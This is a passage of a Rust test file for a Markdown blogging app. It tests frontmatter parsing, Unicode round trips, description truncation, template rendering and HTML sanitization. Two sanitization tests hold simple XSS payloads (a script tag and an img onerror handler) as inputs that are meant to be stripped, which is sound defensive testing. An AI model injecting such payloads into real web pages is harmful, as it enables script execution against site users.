        created_at.format("%B %d, %Y").to_string(),
        "January 15, 2024"
    );
    assert_eq!(raw_content, "This is test content");

    let file_content_no_author = "March 22, 2023\n\n# Test Post\nContent";
    let result = parse_legacy_frontmatter(file_content_no_author).unwrap();
    let (title, author, created_at, raw_content) = result;

    assert_eq!(title, "Test Post");
    assert_eq!(author, "");
    assert_eq!(created_at.format("%B %d, %Y").to_string(), "March 22, 2023");
    assert_eq!(raw_content, "Content");

    // Test YAML frontmatter parsing
    let yaml_content =
        "---\ntitle: My YAML Post\ndate: 2024-01-15\nauthor: John Doe\n---\n\nThis is YAML content";
    let result = parse_yaml_frontmatter(yaml_content).unwrap();
    let (title, author, created_at, raw_content) = result;

    assert_eq!(title, "My YAML Post");
    assert_eq!(author, "John Doe");
    assert_eq!(created_at.format("%Y-%m-%d").to_string(), "2024-01-15");
    assert_eq!(raw_content, "This is YAML content");

    let yaml_no_author = "---\ntitle: No Author Post\ndate: 2023-03-22\n---\n\nContent here";
    let result = parse_yaml_frontmatter(yaml_no_author).unwrap();
    let (title, author, created_at, raw_content) = result;

    assert_eq!(title, "No Author Post");
    assert_eq!(author, "");
    assert_eq!(created_at.format("%Y-%m-%d").to_string(), "2023-03-22");
    assert_eq!(raw_content, "Content here");

    let yaml_file =
        "---\ntitle: Auto Detected\ndate: 2024-06-01\nauthor: Auto\n---\n\nAuto content";
    assert!(yaml_file.starts_with("---\n"));
    let result = parse_yaml_frontmatter(yaml_file).unwrap();
    assert_eq!(result.0, "Auto Detected");

    let legacy_file = "June 01, 2024 | Legacy Author\n\n# Legacy Title\nLegacy content";
    assert!(!legacy_file.starts_with("---\n"));
    let result = parse_legacy_frontmatter(legacy_file).unwrap();
    assert_eq!(result.0, "Legacy Title");
}

#[test]
fn test_yaml_frontmatter_sanitization() {
    // XSS in title
    let yaml = "---\ntitle: <script>alert('xss')</script>Clean Title\ndate: 2024-01-15\nauthor: <img src=x onerror=alert(1)>Safe Author\n---\n\nContent";
    let result = parse_yaml_frontmatter(yaml).unwrap();
    assert_eq!(result.0, "Clean Title");
    assert!(!result.0.contains("<script>"));
    assert_eq!(result.1, "Safe Author");
    assert!(!result.1.contains("<img"));
}

#[test]
fn test_yaml_frontmatter_edge_cases() {
    let no_close = "---\ntitle: Test\ndate: 2024-01-15\nContent without closing";
    assert!(parse_yaml_frontmatter(no_close).is_none());

    let empty_fm = "---\n\n---\n\nContent";
    let result = parse_yaml_frontmatter(empty_fm).unwrap();
    assert_eq!(result.0, "Untitled");
    assert_eq!(result.1, "");
    assert_eq!(result.3, "Content");

    let extra_fields = "---\ntitle: Test\ndate: 2024-01-15\nauthor: Author\nbackground: red\nflagged: true\n---\n\nContent";
    let result = parse_yaml_frontmatter(extra_fields).unwrap();
    assert_eq!(result.0, "Test");
    assert_eq!(result.1, "Author");
    assert_eq!(result.3, "Content");

    let content_with_dashes = "---\ntitle: Dashes Test\ndate: 2024-01-15\n---\n\nSome content\n---\nMore content after dashes";
    let result = parse_yaml_frontmatter(content_with_dashes).unwrap();
    assert_eq!(result.0, "Dashes Test");
    assert_eq!(result.3, "Some content\n---\nMore content after dashes");

    let spaced = "---\ntitle:   Spaced Title  \ndate:  2024-01-15  \nauthor:   Spaced Author  \n---\n\nContent";
    let result = parse_yaml_frontmatter(spaced).unwrap();
    assert_eq!(result.0, "Spaced Title");
    assert_eq!(result.1, "Spaced Author");

    let no_blank = "---\ntitle: No Blank\ndate: 2024-01-15\n---\nContent directly";
    let result = parse_yaml_frontmatter(no_blank).unwrap();
    assert_eq!(result.0, "No Blank");
    assert_eq!(result.3, "Content directly");
}

#[test]
fn test_yaml_round_trip_unicode_symbols() {
    let temp_dir = tempfile::tempdir().unwrap();
    let temp_path = temp_dir.path().to_str().unwrap();
    std::fs::create_dir_all(temp_dir.path().join("content")).unwrap();

    let cases: Vec<(&str, &str, &str)> = vec![
        ("section", "\u{00a7}1.2 Legal Notice", "\u{00a9} Corp"),
        ("math", "\u{0394}x = \u{03c0}r\u{00b2}", "\u{2211}Author"),
        (
            "currency",
            "\u{00a3}100 + \u{20ac}200 + \u{00a5}300",
            "\u{20b9}User",
        ),
        (
            "arrows",
            "\u{2192} Forward \u{2190} Back",
            "\u{21d2} Author",
        ),
        (
            "misc",
            "\u{2713} Done \u{2717} Fail \u{2605} Star",
            "\u{266a} Music",
        ),
        (
            "fractions",
            "\u{00bc} + \u{00bd} = \u{00be}",
            "\u{00b1}Author",
        ),
        (
            "greek",
            "\u{03b1}\u{03b2}\u{03b3} Research",
            "Dr. \u{03b8}\u{03c6}",
        ),
        (
            "mixed",
            "\u{00a7}1: \u{0394}x > 0 & \u{03c0} \u{2248} 3.14",
            "O'\u{00d8}Brien \u{00a9}",
        ),
    ];

    for (id, title, author) in &cases {
        let post = Post {
            id: id.to_string(),
            title: parser::sanitize_text(title),
            author: parser::sanitize_text(author),
            content: String::new(),
            raw_content: "Content".to_string(),
            created_at: Utc::now(),
            nostr_id: None,
        };

        save::save_post_to_file_in_dir(&post, temp_path).unwrap();
        let file_content =
            std::fs::read_to_string(temp_dir.path().join(format!("content/{}.md", id))).unwrap();

        let title_line = file_content
            .lines()
            .find(|l| l.starts_with("title:"))
            .unwrap();
        assert!(
            !title_line.contains("&amp;") && !title_line.contains("&lt;"),
            "title has HTML entities for {}: {}",
            id,
            title_line
        );

        let (parsed_title, parsed_author, _, _) = parse_yaml_frontmatter(&file_content).unwrap();
        assert_eq!(
            parsed_title,
            parser::sanitize_text(title),
            "title round-trip failed for {}",
            id
        );
        assert_eq!(
            parsed_author,
            parser::sanitize_text(author),
            "author round-trip failed for {}",
            id
        );
    }
}

#[test]
fn test_opengraph_description_integration() {
    let storage = PostCache::shared(128);

    let long_emoji_content = "🚀🎉🌟💯".repeat(50);
    let emoji_title = "Emoji Test Post";

    let post_id = generate_post_id(emoji_title, &storage).unwrap();
    let post = Post {
        id: post_id.clone(),
        title: emoji_title.to_string(),
        author: "test".to_string(),
        content: parser::render_markdown(&long_emoji_content),
        raw_content: long_emoji_content.clone(),
        created_at: Utc::now(),
        nostr_id: None,
    };

    let description = pages::post_description(&post.raw_content);

    assert_eq!(description.chars().count(), 163);
    assert!(description.starts_with("🚀🎉🌟💯"));
    assert!(description.ends_with("..."));

    let long_ascii_content =
        "This is a very long post content that should be truncated. ".repeat(10);
    let ascii_title = "Long ASCII Test";

    let post_id2 = generate_post_id(ascii_title, &storage).unwrap();
    let post2 = Post {
        id: post_id2.clone(),
        title: ascii_title.to_string(),
        author: "test".to_string(),
        content: parser::render_markdown(&long_ascii_content),
        raw_content: long_ascii_content.clone(),
        created_at: Utc::now(),
        nostr_id: None,
    };

    let description2 = pages::post_description(&post2.raw_content);

    assert_eq!(description2.chars().count(), 163);
    assert!(description2.starts_with("This is a very long"));
    assert!(description2.ends_with("..."));
}

#[test]
fn test_template_context_building() {
    let mut context = HashMap::new();
    context.insert("title".to_string(), "Test Title".to_string());
    context.insert("content".to_string(), "Test Content".to_string());

    assert_eq!(context.get("title").unwrap(), "Test Title");
    assert_eq!(context.get("content").unwrap(), "Test Content");
    assert!(context.get("missing").is_none());
}

#[test]
fn test_date_formatting() {
    let now = Utc::now();
    let formatted = now.format("%B %d, %Y").to_string();

    // Basic validation that the format works
    assert!(formatted.len() > 10); // Should be a reasonable length
    assert!(!formatted.contains("UTC")); // Should not contain time info
    assert!(!formatted.contains("at")); // Should not contain time info
}

#[test]
fn test_date_format_output() {
    let now = Utc::now();
    let formatted = now.format("%B %d, %Y").to_string();

    // Should be format like "May 1, 2024" (shortest) or "January 15, 2024" (longer)
    assert!(formatted.len() >= 11); // At least "May 1, 2024" length
    assert!(formatted.contains(", "));
    assert!(!formatted.contains("UTC"));
    assert!(!formatted.contains(":"));

    // Example: "March 15, 2024" (no time, no timezone)
}

#[test]
fn test_empty_input_validation() {
    assert!("".trim().is_empty());
    assert!("   ".trim().is_empty());
    assert!(!"hello".trim().is_empty());
    assert!(!"  hello  ".trim().is_empty());
}

#[test]
fn test_ammonia_configuration() {
    // Test that ammonia is properly configured for our use case
    let safe_html = "<strong>Bold</strong> and <em>italic</em>";
    let cleaned = ammonia::clean(safe_html);
    assert!(cleaned.contains("<strong>"));
    assert!(cleaned.contains("<em>"));

    let unsafe_html = "<script>alert('xss')</script><strong>Safe</strong>";
    let cleaned_unsafe = ammonia::clean(unsafe_html);
    assert!(!cleaned_unsafe.contains("<script>"));
    assert!(cleaned_unsafe.contains("<strong>Safe</strong>"));
}

#[test]
fn test_edge_cases() {
    // Test very short titles
    let short_title = "A";
    let storage = PostCache::shared(128);
    let id = generate_post_id(short_title, &storage);
    assert!(id.is_ok());
    assert!(id.unwrap().starts_with("a-"));

    let special_only = "!@#$%^&*()";
    let result = generate_post_id(special_only, &storage);
    assert!(result.is_ok());

    // Test numeric titles
    let numeric = "12345";
    let id = generate_post_id(numeric, &storage);
    assert!(id.is_ok());
    assert!(id.unwrap().starts_with("12345-"));
}

#[test]
fn test_alias_field_validation() {
    // Test valid alias field
    let valid_alias = "John Doe";
    assert!(valid_alias.len() <= 32);

    // Test alias at character limit
    let max_alias = "a".repeat(32);
    assert_eq!(max_alias.len(), 32);

    // Test alias over character limit
    let over_limit_alias = "a".repeat(33);
    assert!(over_limit_alias.len() > 32);

    // Test empty alias (should be allowed as it's optional)
    let empty_alias = "";
    assert!(empty_alias.is_empty());
}

#[test]
fn test_alias_display_formatting() {
    // Test with alias
    let post_with_alias = Post {
        id: "test-alias-post".to_string(),
        title: "Test Post".to_string(),
        author: "Jane Smith".to_string(),
        content: "<p>Content</p>".to_string(),
        raw_content: "Content".to_string(),
        created_at: Utc::now(),
        nostr_id: None,
    };

    let alias_display = if post_with_alias.author.is_empty() {
        String::new()
    } else {
        format!("{} · ", post_with_alias.author)
    };
    assert_eq!(alias_display, "Jane Smith · ");

    // Test without alias
    let post_without_alias = Post {
        id: "test-no-alias-post".to_string(),
        title: "Test Post".to_string(),
        author: "".to_string(),
        content: "<p>Content</p>".to_string(),
        raw_content: "Content".to_string(),
        created_at: Utc::now(),
        nostr_id: None,
    };

    let alias_display_empty = if post_without_alias.author.is_empty() {
        String::new()
    } else {
        format!("{} · ", post_without_alias.author)
    };
    assert_eq!(alias_display_empty, "");
}

#[test]
fn test_title_character_limit() {
    // Test valid title at limit
    let max_title = "a".repeat(128);
    assert_eq!(max_title.len(), 128);

    // Test title over limit
    let over_limit_title = "a".repeat(129);
    assert!(over_limit_title.len() > 128);

    // Test normal title
    let normal_title = "A Great Article Title";
    assert!(normal_title.len() <= 128);
}

#[test]
fn test_static_page_template_rendering() {
    use std::fs;
    use tempfile::tempdir;

    // Create temporary directory for templates
    let temp_dir = tempdir().unwrap();
    let template_path = temp_dir.path().join("post.html");

    // Create a minimal template that includes all the variables used in static pages
    let template_content = r#"<html>
<head><title>{{title}}</title></head>
<body>
<h1>{{title}}</h1>
<div class="meta">{{author_display}}{{created_at}}</div>
<div class="content">{{content}}</div>
</body>
</html>"#;

    fs::write(&template_path, template_content).unwrap();

    // Test the template engine with the same context that static pages use
    let engine = TemplateEngine::new(temp_dir.path().to_str().unwrap());
    let mut context = HashMap::new();
    context.insert("title".to_string(), "Test Page".to_string());
    context.insert("content".to_string(), "<p>Test content</p>".to_string());
    context.insert("created_at".to_string(), "October 5, 2025".to_string());
    context.insert("author".to_string(), String::new());
    context.insert("author_display".to_string(), String::new());
    context.insert("created_at_iso".to_string(), String::new());
    context.insert("url".to_string(), "/test".to_string());
    context.insert("description".to_string(), String::new());

    let result = engine.render("post", &context).unwrap();

    // Verify no template variables remain unreplaced
    assert!(!result.contains("{{"));
    assert!(!result.contains("}}"));

    // Verify content is properly rendered
    assert!(result.contains("<title>Test Page</title>"));
    assert!(result.contains("<h1>Test Page</h1>"));
    assert!(result.contains("<p>Test content</p>"));
    assert!(result.contains("October 5, 2025"));
}

#[test]
fn test_all_static_pages_template_variables() {
    use std::fs;
    use tempfile::tempdir;

    // Create temporary directory for templates
    let temp_dir = tempdir().unwrap();
    let template_path = temp_dir.path().join("post.html");

    // Create a template that uses all variables that could appear in static pages
    let template_content = r#"<html>
<head>
<title>{{title}}</title>
<meta property="og:title" content="{{title}}" />
<meta property="og:url" content="{{url}}" />
<meta property="og:description" content="{{description}}" />
<meta property="article:author" content="{{author}}" />
<meta property="article:published_time" content="{{created_at_iso}}" />
<meta name="author" content="{{author}}" />
</head>
<body>
<h1>{{title}}</h1>
<div class="article-meta">{{author_display}}{{created_at}}</div>
<div class="article-content">{{content}}</div>
</body>
</html>"#;

    fs::write(&template_path, template_content).unwrap();

    let engine = TemplateEngine::new(temp_dir.path().to_str().unwrap());

    // Test each static page type
    let pages = vec!["markup", "legal", "about", "api"];

    for page_name in pages {
        let mut context = HashMap::new();
        context.insert("title".to_string(), format!("{} Page", page_name));
        context.insert("content".to_string(), "<p>Test content</p>".to_string());
        context.insert("created_at".to_string(), "October 5, 2025".to_string());
        context.insert("author".to_string(), String::new());
        context.insert("author_display".to_string(), String::new());
        context.insert("created_at_iso".to_string(), String::new());
        context.insert("url".to_string(), format!("/{}", page_name));
        context.insert("description".to_string(), String::new());

        let result = engine.render("post", &context).unwrap();

        // Verify no template variables remain unreplaced
        assert!(
            !result.contains("{{"),
            "Page {} has unreplaced template variables",
            page_name
        );
        assert!(
            !result.contains("}}"),
            "Page {} has unreplaced template variables",
            page_name
        );

        // Verify basic structure
        assert!(result.contains(&format!("<title>{} Page</title>", page_name)));
        assert!(result.contains(&format!("<h1>{} Page</h1>", page_name)));
        assert!(result.contains("October 5, 2025"));
    }
}

#[test]
fn bundled_pages_copy_when_missing_and_do_not_overwrite() {
    use std::fs;

    let temp = tempfile::tempdir().unwrap();
    let pages = temp.path().join("pages");
    let content = temp.path().join("content");
    fs::create_dir(&pages).unwrap();
    fs::write(pages.join("about.md"), "bundled about").unwrap();
    fs::write(pages.join("notes.txt"), "ignore me").unwrap();

    let installed = install_bundled_pages_from(&pages, &content).unwrap();
    assert_eq!(installed, vec!["about.md".to_string()]);
    assert_eq!(
        fs::read_to_string(content.join("about.md")).unwrap(),
        "bundled about"
    );
    assert!(!content.join("notes.txt").exists());

    fs::write(content.join("about.md"), "local edit").unwrap();
    fs::write(pages.join("legal.md"), "bundled legal").unwrap();
    let installed = install_bundled_pages_from(&pages, &content).unwrap();
    assert_eq!(installed, vec!["legal.md".to_string()]);
    assert_eq!(
        fs::read_to_string(content.join("about.md")).unwrap(),
        "local edit"
    );
    assert_eq!(
        fs::read_to_string(content.join("legal.md")).unwrap(),
        "bundled legal"
    );
}
